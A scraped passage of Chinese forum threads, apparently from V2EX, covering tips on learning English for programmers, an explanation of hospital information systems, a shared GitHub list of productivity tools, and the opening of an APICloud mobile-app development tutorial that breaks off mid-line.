"对，所以想提升英语这门语言的诉求之外，也很清楚带来的高的附加值，比如思维方式！", " 再交女友是没戏了，我家有领导了 :)", " 个人页有啊, 没啥好看的, 英文还行, 技术是刚刚起步 :P", "晕，感觉题主走了弯路，先安装一个 chrome ，谷歌浏览器或者网易网页翻译（但是这个经常不太灵光啊），然后看的文档大部分都是网页版的吧，然后谷歌翻译，一下搞定，再感觉哪里逻辑不通，哪里不会原文翻译哪里。细看那部分就行了。写程序已经如此艰难了，为何还要自虐。。只要不看英文 pdf ，这个技巧都管用。。。", "留学", "哈哈，今天好像在 TW 的微信公众号看到楼主了 ==。口语的话推荐《赖世雄美语音标》， APP 推荐《英语趣配音》。发音准了，听力就差不多啦。", "我是北美某蓝翔的程序员，自己在这边接触了太多国内来的中年人。感觉这些人最大的问题不是英语水平而是不自信。\r", "\r", "我的经验是你口音不要自卑，语法不用太重视。重要的是听得懂，表达的对方能明白。我看国内好多人因为口音自卑之类的每次我都说真的内容重要程度远大于语音。\r", "\r", "阅读的话多看就行。技术文档的英语是最简单的英语，看不懂我怀疑 1.基础词汇不认识的太多。 2.心理问题，一看英文就害怕。\r", "\r", "另外我跟在国内接受教育的讨论过，有时候在国外接受教育读技术文档度得快因为我们把一些专业名词的英语当做母语来理解。比如以后看到 agile 不要去想敏捷，他就是个名字诶宅奥。", "口音没事的，一个老师说过，除非你 5 岁之前来到英语环境，不然你总归是有口音的。\r", "\r", "ps 一个美本的童鞋说 how r u 回复的时候一般说 good 不说 fine 。说是九年义务教育和 native speaker 的区别。原因我不知道……", " (≧▽≦)正在 homework\r", "\r", "好哒，谢谢", " 人嘛，总是会有些追求，这个因素是复杂的或受外界影响的，虽然会虐 但是得到的会非常受益。", " 明白你的意思，戳到我心口里了。。。非常感谢！", "口音是非常次要的,张大嘴巴说清楚就行了.\r", "巧妇难为无米之炊.楼主的这个状态还是找些适合自己的语法书比较合适.\r", "对中文母语者而言,英语的听-说几乎就是两个问题,听懂要比会说容易很多.语法就是知道自己在说什么的依据.然后才是熟能生巧.\r", "\r", "这和学编程是一样的,实战固然重要,但是基础还是要有的.你不学计算机的基本工作原理,不学语言的基础细节,就容易陷在各种等效 /类比 /强记中", "高考那会看哈利波特 那会的阅读速度真吓人 高考题 30 分钟就做完了", "现在慢下来了", "前面几位提供的听说思路都不错，我再给提供个：在你手机上装上 Quora ，国外版的知乎，都是英文，关注你爱看的，这样看起来也有意思", "谢谢各位的分享", "我就是多看英文文档。。", "对，微软小英也很棒~", "微信上搜。", "不考虑楼主当前英语水平的都是胡说八道。什么出国留学，直接生啃英文技术文档的都搞出来了，楼主要有这英语水平还用来这里这么问？根据楼主“ 平时工作中看一些文档资料也相对吃力，反正就是凑和看。然而，逻辑稍微复杂一些 就肯定懵逼！”猜测，估计勉强 4 级或者 4 级都过不了；那么最适合你的应该是《新概念英语》系列，从第二册开始。楼主的情况和我以前很相似，阅读英文技术文档、书刊很是痛苦，需要边查单词边猜句义，最后不得不放弃阅读原生英文。学习英语需要时间和毅力（需要多长时间取决于你的付出），当你学完第三册，就可以较为流畅的阅读英文文档了（还是需要查单词）。第四册学了一半可以开始考虑考个雅思试一下。\r", "  基于本人经历，从英语渣到雅思 overall 7 ，阅读 8.5 。恬着脸贴出来这分数只是希望楼主少走弯路。学习英语没有捷径，必须做好吃苦的准备。", " 感谢哥们儿的中肯回应和建议！\r", "对，我不想再走什么捷径或随意的开始，因此在筛选贴合自身情况 罗列出科学、适合自己的方法！", "看小说，居然都没人提这个。\r", "我是多亏了看小说。\r", "用好工具是关键，以前是用云词阅读器（现在垮了，好怀念，好希望有相同的出现）。现在是用 kindle", "China daily 和 英语流利说", "英语专业的路过。。。看了看回复，学英语的方法真是成千上百种，但到底哪种有用？楼主还得自己亲身试验一下哪个好用。\r", "写代码的都知道，提升最大的不是学习的过程，而是实战的过程。你给自己多提供一些实战的机会。\r", "比如亚马逊的： ", " ，里面不少要求中英互译的任务，任务做完了给钱。\r", "\r", "我从小就对语言感兴趣，所以会想方设法把自己「困」在语言的环境中，例如周边的电子设备能改英语的改英语，不差英汉词典，只保留了一本柯林斯。再就是硬着头皮跟老外接触之类的。\r", "\r", "反正我学英语从没靠那些鸡巴 APP ，感觉很扯。", " 感谢哥们儿的中肯回应、解析和建议！", "我是考了托福 GRE 然后人肉翻墙，英语就变好了", " 不好意思回复晚了，我是不停读看不懂的内容，联系上下文猜出意思来，如果能猜对至少一次，这个词下次见的时候就不会忘了。", " 抱歉，说的不是特别准确。就是理科里面中国人统治，平时不同科交流也少，同胞天天在一起，几乎不怎么说英语，所以对英语提升帮助很小", " 我就好奇问一句啥学校这么牛逼（因为真的没见过（除了野鸡）），干嘛道歉……"]},
{"content": ["<div class=\"topic_content\">医院用的 heisi （音译，不知道怎么写）系统是个啥东东。有哪位大神接触过，给扫扫盲。</div>"], "reply": "11", "tittle": "求扫盲： heisi。大神赐教", "comment": ["HIS", "还以为黑丝呢。。。", "Hospital Information System", "黑丝？", "HIS 医院的管理系统，内容非常多。", "就是你去医院看病，挂号，电子病历，处方，拿药，财务等一系列相关业务操作的综合系统，一般由各种业务接口组成，医院内网使用，除公众号，服务窗等特有业务外很少有公网业务。", " 高了！", " 感谢。", " 谢谢，谢谢。", " 这个牛了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>前些天在逛 github 的时候，看到有这样一个项目，<a href=\"https://github.com/dbarobin/liqi\" rel=\"nofollow\">liqi</a> ,列出了自己平时用到的一些利器，我觉得很有意思，也想起来其实早在 2013 年的时候，自己就写过<a href=\"http://blog.sina.com.cn/s/blog_63a3d9b70101gzsy.html\" rel=\"nofollow\">《我的电脑软件最佳搭配》</a> 这样的东西（该文已经被新浪和谐了，莫名其妙），又勾起了我的罗列欲，看那个项目中提到的利器以 Mac 平台的为主，因此就自己 fork 了这个项目，然后仿照着原有项目的基本结构，列出了我的日常学习工作生活中使用的一些利器，软件方面则是 windows 平台。</p>\n<p>其他的也不废话了，直接上链接： <a href=\"https://github.com/zhangolve/liqi\" rel=\"nofollow\">https://github.com/zhangolve/liqi</a></p>\n<p>欢迎 star 。哈哈哈</p>\n</div></div>"], "reply": "9", "tittle": "我的工作生活利器", "comment": ["+1", "学习一下", "提升生产效率的，都要顶一下", "挺好玩的", "看了楼主分享的利器。其实感觉也没什么。\r", "\r", "1 、先说说你引用别人的这个利器。他用的东西挺简单的。没什么特别。像是一些 file system 的东西，还得自己去花钱买软件实现在 osx 上读取 ntfs 等，实在是 noob 。估计是个动手能力一般的程序员吧。\r", "其他有些应用是他自己买的。他喜欢就好。可是在我大 GNU/Linux 的眼里，这些都是 noob 用的工具，我们可以自己造工具，有很多命令行 /GUI 的工具可以去实现。（怎么刮胡刀也出来了，这是要在 github 上唠叨家常的节奏……有点浪费阅读时间！家常可以写到博客里）一些提升效率的工具，为什么不去用用 GNU/Linux KDE 呢？\r", "还有一些用到的应用，在开源社区都能找到对应的。看来是入了 mac 教无法自拔。\r", "那我问问如果这个人遇到一个硬盘是 LUKS 用的 RSA 4096 方法加密的 zfs 硬盘，他用 Mac 怎么办？去花钱 Apple store 里买个应用吗？没有怎么办？自己拿 C/C++ 写一个？我感觉他做不了。参考意义不大。\r", "\r", "\r", "当然，也不能把任何分享家常的人看成从 0 到 1 的能力的人。他可能以为自己赚钱不少，可是 0 到 1 的收入也是可观的。\r", "\r", "2 、题主分享自己的挺好的。简介明了，比较有 balance 而不是一味地在广告。\r", "\r", "有机会可以做个 gitbook ，因为有大纲的资料，更容易阅读，找重点。\r", "\r", "\r", "提升效率的话，尝试配置一下 GNU/Linux 选择一个稳定的发行版，一个稳健的桌面管理器，例如 kde ， xfce4 或者 awesome 或者其他。你都不用花钱，按一下快捷键，电脑自动给你阅读所有屏幕上的词，而且你还可以更换修改语音引擎，把你自己的语音录进去，进行机器学习，然后再融化成你自己的 TTS 。这样是 macOS 做不到的。虽然我也有个 Pro 。", " 以前也是狂招这类分享。后来发现然并卵，除非自己要用。否则懒得看。。如果是强需求，要么就是 app store 里面有了。肯定早下了。要么就是没实现，可能会自己挖个坑去做一个。但大部分情况前者偏多。", " 感谢你的评价，很中肯。我是 fork 过来的项目，很多时候是沿用了最初版本的思路，因此也出现了刮胡刀之类，我没有 mac ，因此写了一个 windows 版本的，至于「利器」，我也承认我自己列出来的很多东西只是自己在用而已，可能也确实谈不上利器。", " \r", "人家都说是 [我的工作，学习，和生活] ，这种东西发出来的意义在于三人行必有我师，博采众长，又不是写教科书要顾及这个顾忌那个考虑这个考虑那个。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><em>第一天：了解 APICloud 平台、理解 APICloud 应用设计思想、掌握平台使用流程。学习如何对一款 APP 进行需求分析、功能分解和架构设计等编码之前重要的准备工作。</em></p>\n<p><strong>课程相关材料：</strong></p>\n<p><a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/99f27562d0b602d064b57569475dc00d.zip\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/99f27562d0b602d064b57569475dc00d.zip</a></p>\n<p><strong>本期课程演示案例（仿每日优鲜 APP ）：</strong></p>\n<p><a href=\"http://downloadpkg.apicloud.com/app/download?path=http://7y44yj.com1.z0.glb.clouddn.com/c7432757db98f0d6f742a2522461c0a5_d\" rel=\"nofollow\">http://downloadpkg.apicloud.com/app/download?path=http://7y44yj.com1.z0.glb.clouddn.com/c7432757db98f0d6f742a2522461c0a5_d</a></p>\n<p><strong>教程更新：</strong></p>\n<p>Github 地址： <a href=\"https://github.com/apicloudcom/APICloud-7Days-Online-Training-Tutorials/blob/master/Day1.md\" rel=\"nofollow\">https://github.com/apicloudcom/APICloud-7Days-Online-Training-Tutorials/blob/master/Day1.md</a></p>\n<h2><strong>学习目标</strong></h2>\n<ul>\n<li>\n<p>总体上了解一下 APICloud 平台，重点介绍相关的学习资源，入门资料，常见的 FAQ 等</p>\n</li>\n<li>\n<p>明确我们这七天要开发一个什么样的 APP ，明确功能需求，跟上每天的课程节奏，可以课前预习</p>\n</li>\n<li>\n<p>梳理出对于一款 APP ，在开发之前（ Coding 之前），一些通用而又重要的准备工作，适合于所有 APP 开发，而非单指 APICloud</p>\n</li>\n</ul>\n<h2><strong>主要内容</strong></h2>\n<h3><strong>1.APICloud 平台介绍</strong></h3>\n<p>1.1 查看 APICloud 平台能力</p>\n<p>1.2 APICloud 应用的开发模式和使用的技术语言</p>\n<p>1.3 APICloud 技术、产品、生态、案例、商业模式的总体介绍</p>\n<p>1.4 APICloud 开发者相关的服务支撑体系</p>\n<p>1.5 新手应该如何开始入门 APICloud 应用开发</p>\n<h3><strong>2.APICloud 平台使用流程</strong></h3>\n<p>2.1 APICloud 云控制台使用</p>\n<p>2.2 选择一款主流 H5 编码工具并安装相应的 APICloud 插件</p>\n<p>2.3 APICloud 应用开发的基础操作流程</p>\n<h3><strong>3.应用需求分析</strong></h3>\n<p>3.1 梳理需求说明文档</p>\n<p>3.2 进行 UE/UI 设计</p>\n<h3><strong>4. 总体架构设计</strong></h3>\n<p>4.1 APICloud 应用设计思想</p>\n<h3><strong>5. UI 架构设计</strong></h3>\n<p>5.1 APICloud 应用的 UI 组成结构</p>\n<p>5.2 APICloud 界面布局 5 大组件</p>\n<p>5.3 APICloud 混合渲染技术原理</p>\n<p>5.4 使用 APICloud5 大 UI 组件完成应用 UI 架构设计</p>\n<p>5.5 输出 APP 的 UI 架构设计文档</p>\n<h3><strong>6. 功能点分解</strong></h3>\n<p>6.1 基于需求说明，梳理出主要功能点</p>\n<p>6.2 为每个功能点，给出合适的技术实现方案</p>\n<p>6.3 在 APICloud 聚合 API 找到功能点对应的模块</p>\n<p>6.4 输出 APP 的功能模块分解文档</p>\n<h3><strong>7. 开放服务选择</strong></h3>\n<p>7.1 基于需求说明，梳理出需要使用的开放服务</p>\n<p>7.2 调研不同的开放服务商所提供的服务是否能满足自己应用的需求</p>\n<p>7.3 在 APICloud 聚合 API 找到对应的开放服务模块</p>\n<p>7.4 输出 APP 的开放服务分解文档</p>\n<h3><strong>8. 数据接口定义</strong></h3>\n<p>8.1 定义服务端接口文档</p>\n<p>8.2 输出服务端接口调试文件</p>\n<h3><strong>9. 应用证书和第三方 Key 申请</strong></h3>\n<p>9.1 申请应用证书</p>\n<p>9.2 确定应用包名</p>\n<p>9.3 申请开放平台相关 Key</p>\n<h2><strong>1.了解 APICloud 平台</strong></h2>\n<p><strong>1.1 查看 APICloud 平台能力</strong></p>\n<ul>\n<li>\n<p>要使用 APICloud 平台开发 APP ，很多用户的第一个问题是： APICloud 平台能否满足自己的 APP 开发需求?</p>\n</li>\n<li>\n<p>可以带着目的来了解 APICloud 平台能力，掌握如何快速查找相关的能力</p>\n</li>\n</ul>\n<p>查看 API 文档了解 APICloud 文档组织结构，学会通过文档搜索，找到需要的功能*</p>\n<p>APICloud 平台功能体系:</p>\n<p><img alt=\"1.1.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d8654db728.png\"></p>\n<p><strong>1.2 APICloud 应用的开发模式和使用的技术语言</strong></p>\n<ul>\n<li>\n<p>使用 APICloud 开发 APP 需要什么技术? 自己的团队是否适合?</p>\n</li>\n<li>\n<p>学习曲线是什么样子？入门是否简单？</p>\n</li>\n</ul>\n<p>APICloud 应用开发模式：标准的 HTML/CSS/JS + APICloud 扩展 API</p>\n<p><img alt=\"1.2.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d8670049c3.png\"></p>\n<p>APICloud 扩展 API 调用方式：就是使用标准的 JavaScript 语法，与标准的 JavaScript 对象调用方式一致。\n核心模块在 window.api 对象下，不需要单独引用，可以直接调用\napi.methodName(param, callback);</p>\n<p>扩展模块需要 require 引入，遵守 CommonJS 规范</p>\n<p>var module = api.require('moduleName');</p>\n<p>module.methodName(param, callback);</p>\n<p>param: {} //参数，是一个 JSON 对象</p>\n<p>callback: function(ret, err){} //回调函数，是一个 Function 对象，方法调用的结果通过此函数返回</p>\n<p>例如：</p>\n<ul>\n<li>\n<p>打开新窗口： api.openWin(); <a href=\"http://docs.apicloud.com/Client-API/api#33\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#33</a></p>\n</li>\n<li>\n<p>打开系统通讯录： api.openContacts(); <a href=\"http://docs.apicloud.com/Client-API/api#26\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#26</a></p>\n</li>\n<li>\n<p>录音： api.startRecord(); <a href=\"http://docs.apicloud.com/Client-API/api#54\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#54</a></p>\n</li>\n<li>\n<p>缓存网络图片： api.imageCache(); <a href=\"http://docs.apicloud.com/Client-API/api#78\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#78</a></p>\n</li>\n<li>\n<p>加载 fs 模块： var fs = api.require('fs'); <a href=\"http://docs.apicloud.com/Client-API/api#000\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#000</a></p>\n</li>\n<li>\n<p>新建一个文件： fs.createFile(); <a href=\"http://docs.apicloud.com/Client-API/Func-Ext/fs#2\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/Func-Ext/fs#2</a></p>\n</li>\n<li>\n<p>加载二维码 /条形码扫描模块： var scanner =api.require('FNScanner');\n<a href=\"http://docs.apicloud.com/Client-API/api#000)\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#000)</a></p>\n</li>\n<li>\n<p>打开二维码 /条形码扫描: scanner.openScanner(); <a href=\"http://docs.apicloud.com/Client-API/Func-Ext/FNScanner#1\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/Func-Ext/FNScanner#1</a></p>\n</li>\n</ul>\n<p><em>你可以把 H5 理解一门技术一门语言，但他还没达到一个平台的水平</em></p>\n<p>为什么要扩展 API ？</p>\n<p><img alt=\"1.3.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d86885229a.png\"></p>\n<p>APICloud 聚合 API <a href=\"http://www.apicloud.com/modulestore\" rel=\"nofollow\">http://www.apicloud.com/modulestore</a></p>\n<p>APICloud 平台定位：</p>\n<p><img alt=\"1.4.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d86a0b009f.png\"></p>\n<p><strong>1.3 APICloud 技术、产品、生态、案例、商业模式的总体介绍</strong></p>\n<ul>\n<li>\n<p>从整体各个方面来看 APICloud 怎么样？</p>\n</li>\n<li>\n<p>开发模式、技术优势、功能体验、谁在使用、开发者生态、商业模式等等；</p>\n</li>\n</ul>\n<p>推荐视频： APICloud 视频之初级代码篇第 1-3 讲 <a href=\"http://www.apicloud.com/video_list\" rel=\"nofollow\">http://www.apicloud.com/video_list</a></p>\n<p><strong>1.4 了解 APICloud 开发者相关的服务支撑体系</strong></p>\n<ul>\n<li>\n<p>如何解决开发者的问题？能为开发者提供哪些机会？是否有围绕开发者的生态模式？</p>\n</li>\n<li>\n<p>是否有一个完善的开发者相关支持服务体系来方便技术学习和社区交流？</p>\n</li>\n<li>\n<p>是否有一个完善的生态体系，来支持支撑 APICloud APP 开发，来满足各种不同的行业需求，来支撑实现需求复杂，功能强大的应用。</p>\n</li>\n<li>\n<p>开发平台 <a href=\"http://www.apicloud.com\" rel=\"nofollow\">http://www.apicloud.com</a></p>\n</li>\n<li>\n<p>开发工具 <a href=\"http://www.apicloud.com/devtools\" rel=\"nofollow\">http://www.apicloud.com/devtools</a></p>\n</li>\n<li>\n<p>开发文档 <a href=\"http://docs.apicloud.com/\" rel=\"nofollow\">http://docs.apicloud.com/</a></p>\n</li>\n<li>\n<p>开发者社区 <a href=\"http://community.apicloud.com/bbs/forum.php\" rel=\"nofollow\">http://community.apicloud.com/bbs/forum.php</a></p>\n</li>\n<li>\n<p>VIP 技术支持 <a href=\"http://www.apicloud.com/vipservice/plan\" rel=\"nofollow\">http://www.apicloud.com/vipservice/plan</a></p>\n</li>\n<li>\n<p>示例源码分享 <a href=\"http://www.apicloud.com/source_code\" rel=\"nofollow\">http://www.apicloud.com/source_code</a></p>\n</li>\n<li>\n<p>商业案例展示 <a href=\"http://www.apicloud.com/cases\" rel=\"nofollow\">http://www.apicloud.com/cases</a></p>\n</li>\n<li>\n<p>模块 Store （聚合 API ） <a href=\"http://www.apicloud.com/modulestore\" rel=\"nofollow\">http://www.apicloud.com/modulestore</a></p>\n</li>\n<li>\n<p>模版 Store <a href=\"http://app.apicloud.com/appCustom\" rel=\"nofollow\">http://app.apicloud.com/appCustom</a></p>\n</li>\n<li>\n<p>应用定制服务 <a href=\"http://app.apicloud.com/customIntroduce\" rel=\"nofollow\">http://app.apicloud.com/customIntroduce</a></p>\n</li>\n</ul>\n<p><strong>1.5 新手应该如何开始入门 APICloud 应用开发</strong></p>\n<p>如何能快速入门？最好的学习资料来哪？</p>\n<ul>\n<li>\n<p>新手开发指南 <a href=\"http://docs.apicloud.com/APICloud/junior-develop-guide\" rel=\"nofollow\">http://docs.apicloud.com/APICloud/junior-develop-guide</a></p>\n</li>\n<li>\n<p>新手教程合集贴 <a href=\"http://community.apicloud.com/bbs/forum.php?mod=viewthread&amp;tid=7926&amp;extra=page%3D1\" rel=\"nofollow\">http://community.apicloud.com/bbs/forum.php?mod=viewthread&amp;tid=7926&amp;extra=page%3D1</a></p>\n</li>\n<li>\n<p>视频教程 <a href=\"http://www.apicloud.com/video_list\" rel=\"nofollow\">http://www.apicloud.com/video_list</a></p>\n</li>\n<li>\n<p>线上培训 <a href=\"http://www.apicloud.com/vipservice/course\" rel=\"nofollow\">http://www.apicloud.com/vipservice/course</a></p>\n</li>\n</ul>\n<h2><strong>2. 掌握 APICloud 平台使用（最基本）</strong></h2>\n<p><strong>2.1 掌握 APICloud 控制台使用</strong> <a href=\"https://www.apicloud.com/console\" rel=\"nofollow\">https://www.apicloud.com/console</a></p>\n<p>APICloud 应用开发的基本流程</p>\n<ul>\n<li>\n<p>创建应用</p>\n</li>\n<li>\n<p>配置图标启动页</p>\n</li>\n<li>\n<p>设置证书</p>\n</li>\n<li>\n<p>同步代码</p>\n</li>\n<li>\n<p>添加模块</p>\n</li>\n<li>\n<p>云编译</p>\n</li>\n</ul>\n<p>推荐视频： APICloud 视频之初级代码篇第 5 讲 <a href=\"http://www.apicloud.com/video_list\" rel=\"nofollow\">http://www.apicloud.com/video_list</a></p>\n<p><strong>2.2 选定一款主流前端编码工具并安装相应的 APICloud 插件</strong> <a href=\"https://www.apicloud.com/devtools\" rel=\"nofollow\">https://www.apicloud.com/devtools</a></p>\n<p>APICloud 应用编码调试原理：</p>\n<p><img alt=\"1.5.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d86bdaf5eb.png\"></p>\n<p>APPLoader 加载 Widget 的路径：</p>\n<ul>\n<li>\n<p>Android: sdcard/UZMap/wgt/</p>\n</li>\n<li>\n<p>iOS: Document/uzfs/wgt/</p>\n</li>\n</ul>\n<p>目前 APICloud 开发工具插件支持： Sublime Text 、 WebStorm 、 Atom 、 Eclipse.</p>\n<p>推荐使用： Sublime Text + APICloud Plugin</p>\n<p>推荐使用： Atom + APICloud Plugin</p>\n<p>插件功能包括：</p>\n<ul>\n<li>\n<p>新建应用</p>\n</li>\n<li>\n<p>新建文件</p>\n</li>\n<li>\n<p>自定义代码提示</p>\n</li>\n<li>\n<p>USB 真机同步</p>\n</li>\n<li>\n<p>WiFi 真机同步</p>\n</li>\n<li>\n<p>USB 日志输出</p>\n</li>\n<li>\n<p>WiFi 日志输出</p>\n</li>\n<li>\n<p>官方 Loader</p>\n</li>\n<li>\n<p>自定义 Loader</p>\n</li>\n<li>\n<p>开启 Debug 模式</p>\n</li>\n<li>\n<p>查看错误提示</p>\n</li>\n</ul>\n<p>推荐视频： Sublime 使用教程 Window&amp;Mac <a href=\"http://www.apicloud.com/video_list\" rel=\"nofollow\">http://www.apicloud.com/video_list</a></p>\n<p>推荐文档： Sublime 插件使用说明 <a href=\"http://docs.apicloud.com/Dev-Tools/sublime-apicloud-plugin\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Tools/sublime-apicloud-plugin</a></p>\n<p>推荐文档： Atom 插件使用说明 <a href=\"http://docs.apicloud.com/Dev-Tools/Atom-apicloud-plugin\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Tools/Atom-apicloud-plugin</a></p>\n<p>推荐视频： APICloud 视频之初级代码篇第 9-11 讲自定义 loader 使用 <a href=\"http://www.apicloud.com/video_play?list=2&amp;index=1\" rel=\"nofollow\">http://www.apicloud.com/video_play?list=2&amp;index=1</a></p>\n<p>推荐文档：自定义 loader 说明 <a href=\"http://docs.apicloud.com/Dev-Guide/Custom_Loader\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Guide/Custom_Loader</a></p>\n<p>APICloud CLI 工具</p>\n<p>一套基于 Nodejs 的命令行，包括 APICloud 工具插件全部核心功能，基于 GPL3.0 开源。开发者可以通过调用命令行的方式将 APICloud 工具轻松集成到任何前端开发工具中。</p>\n<p>推荐文档： apicloud-cli 工具使用说明 <a href=\"http://docs.apicloud.com/Dev-Tools/apicloud-cli\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Tools/apicloud-cli</a></p>\n<p>推荐文档： APICloud 开发工具核心库 <a href=\"http://docs.apicloud.com/Dev-Tools/apicloud-tools-core\" rel=\"nofollow\">http://docs.apicloud.com/Dev-Tools/apicloud-tools-core</a></p>\n<p><strong>2.3 APICloud 应用开发的基础操作流程</strong></p>\n<p><img alt=\"1.6.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d86d878e95.png\"></p>\n<p>在 APICloud 平台上有 4 种查看 APP 运行效果的手段：</p>\n<ul>\n<li>\n<p>官方 AppLoader</p>\n</li>\n<li>\n<p>自定义 AppLoader</p>\n</li>\n<li>\n<p>云编译测试包</p>\n</li>\n<li>\n<p>云编译正式包</p>\n</li>\n</ul>\n<h2><strong>3.应用需求分析</strong></h2>\n<p><strong>3.1 梳理需求</strong></p>\n<p>输出需求说明文档： requirement-spec.xml]</p>\n<p>( <a href=\"http://7xy8na.com1.z0.glb.clouddn.com/apicloud/3df056696e3156d08cbaeed4aed1c42c.xlsx\" rel=\"nofollow\">http://7xy8na.com1.z0.glb.clouddn.com/apicloud/3df056696e3156d08cbaeed4aed1c42c.xlsx</a></p>\n<p><strong>3.2 进行 UE/UI 设计</strong></p>\n<p>输出 UE/UI 设计： 产品原型文件、原始 UI 设计图、 UI 切图</p>\n<h2><strong>4. 整体架构设计</strong></h2>\n<p><strong>4.1 理解 APICloud 应用设计思想</strong></p>\n<p>Client/Cloud 架构设计，完整的前后端分离，在移动端实现界面和功能，在服务端提供数据和服务。</p>\n<p><img alt=\"1.7.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d86f247394.png\"></p>\n<h2><strong>5. UI 架构设计</strong></h2>\n<p>使用 APICloud 界面布局 5 大组件进行 UI 架构设计</p>\n<p><strong>5.1 APICloud 应用的 UI 组成结构</strong></p>\n<p><img alt=\"1.8.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d870cc2fc0.png\"></p>\n<p><strong>5.2 APICloud 界面布局 5 大组件</strong></p>\n<ul>\n<li>\n<p>Widget: Widget 是 APICloud 应用运行管理的最小单位，每一个 APICloud 应用至少包含一个 Widget ，每一个 Widget 都具有独立的代码、资源和窗口系统， Widget 之间可以相互调用。 Widget 在 UI 上表现为一个独立的窗口容器，内部可以包含 Layout 、 Window 或 UIModule ，并且同一时刻，应用中只能有一个 Widget 在界面上显示。</p>\n<ul>\n<li>\n<p>打开 Widget: api.openWidget() <a href=\"http://docs.apicloud.com/Client-API/api#32\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#32</a></p>\n</li>\n<li>\n<p>关闭 Widget: api.closeWidget() <a href=\"http://docs.apicloud.com/Client-API/api#14\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#14</a></p>\n</li>\n</ul>\n</li>\n<li>\n<p>Layout: Layout 实现了某一种特定的布局效果，通过定义好的布局来组织一组 Window 或 Frame 来完成整体的界面布局效果。每一个 Layout 内部可以包含 Window 和 Frame 。</p>\n</li>\n</ul>\n<p>( <a href=\"http://docs.apicloud.com/Client-API/api#12)\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#12)</a></p>\n<ul>\n<li>\n<p>打开 FrameGroup: api.openFrameGroup() <a href=\"http://docs.apicloud.com/Client-API/api#28\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#28</a></p>\n</li>\n<li>\n<p>关闭 FrameGroup: api.closeFrameGroup() <a href=\"http://docs.apicloud.com/Client-API/api#11\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#11</a></p>\n</li>\n<li>\n<p>Window: Window 是一个独立的 Naive 窗口（ Android 或 iOS ），是 APICloud 应用界面布局的基本组件，每一个 APP 都是由多个 Window 组成。 Window 所承载的内容其所加载的 HTML 页面决定。每一个 Window 都是独立的 Web 容器，有自己独立的 Dom 树结构，并且独立进行渲染。 Window 的起点位于屏幕左上角，宽高占满屏幕，不可修改。 Window 内部可以包含 Layout 、 Frame 和 UIModule 。</p>\n<ul>\n<li>\n<p>打开 Window: api.openWin() <a href=\"http://docs.apicloud.com/Client-API/api#33\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#33</a></p>\n</li>\n<li>\n<p>关闭 Window: api.closeWin() <a href=\"http://docs.apicloud.com/Client-API/api#15\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/api#15</a></p>\n</li>\n</ul>\n</li>\n<li>\n<p>Frame: Frame 是一个独立的 Native 视图（ Android 或 iOS ），视图所承载的内容其所加载的 HTML 页面决定。每一个 Frame 都是独立的 Web 容器，有自己独立的 Dom 树结构，并且独立进行渲染。 Frame 的位置和宽高可通过参数配置。 Frame 通常作为一个子视图，嵌入到 Window 或 Layout 中， Frame 内部可以包含 UIModule 。</p>\n<ul>\n<li>\n<p>打开 Frame: <a href=\"http://docs.apicloud.com/Client-API/api#27\" rel=\"nofollow\">api.openFrame()</a></p>\n</li>\n<li>\n<p>关闭 Frame: <a href=\"http://docs.apicloud.com/Client-API/api#10\" rel=\"nofollow\">api.closeFrame()</a></p>\n</li>\n</ul>\n</li>\n<li>\n<p>UIModule: UI 模块是由一组 Native 的视图组成，来实现某种特定的 UI 界面效果，可以是全屏展示也可以只填充指定的区域。每一个 UI 模块都具有自己独立的生命周期、界面布局、事件管理和数据交换。 UI 模块通常需要嵌入到 Window 或 Frame 中使用。</p>\n<ul>\n<li>\n<p>加载 UIModule: api.require()</p>\n</li>\n<li>\n<p>打开 UIModule(以 UIScrollPicture 为例)(UIScrollPicture.open() <a href=\"http://docs.apicloud.com/Client-API/UI-Layout/UIScrollPicture#m1\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/UI-Layout/UIScrollPicture#m1</a></p>\n</li>\n<li>\n<p>关闭 UIModule(以 UIScrollPicture 为例)(UIScrollPicture.close() <a href=\"http://docs.apicloud.com/Client-API/UI-Layout/UIScrollPicture#m2\" rel=\"nofollow\">http://docs.apicloud.com/Client-API/UI-Layout/UIScrollPicture#m2</a></p>\n</li>\n</ul>\n</li>\n</ul>\n<p><strong>5.3 理解 APICloud 混合渲染技术原理</strong></p>\n<p>浏览器的页面渲染机制：</p>\n<p><img alt=\"1.9.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d87240329c.png\"></p>\n<p>APICloud 混合渲染机制：</p>\n<p><img alt=\"1.10.png\" src=\"https://ooo.0o0.ooo/2017/02/10/589d874066acd.png\"></p>\n<p><strong>5.4 使用 APICloud5 大 UI 组件完成应用 UI 架构设计</strong></p>\n<p>根据产品原型和 UI 设计图，按界面逐个分析。</p>\n<p>编写一个小的界面布局的测试 Demo <a 